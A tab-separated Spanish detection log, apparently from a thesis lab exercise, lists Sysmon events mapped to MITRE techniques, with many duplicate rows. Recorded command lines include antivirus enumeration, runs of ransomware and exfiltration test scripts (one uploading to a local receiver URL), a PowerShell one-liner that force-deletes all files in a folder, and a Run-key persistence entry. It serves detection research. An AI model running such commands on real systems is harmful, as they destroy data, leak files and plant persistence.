Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:52:15.300Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P2	TEC-008	T1485 context		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P2	TEC-008	T1485 context		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "SetValue", "UtcTime": "2026-06-24 12:51:33.974", "ProcessGuid": "6BC49A7D-D2D5-6A3B-D768-000000009801", "ProcessId": 10524, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "Details": "C:\\Windows\\System32\\calc.exe", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	13	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
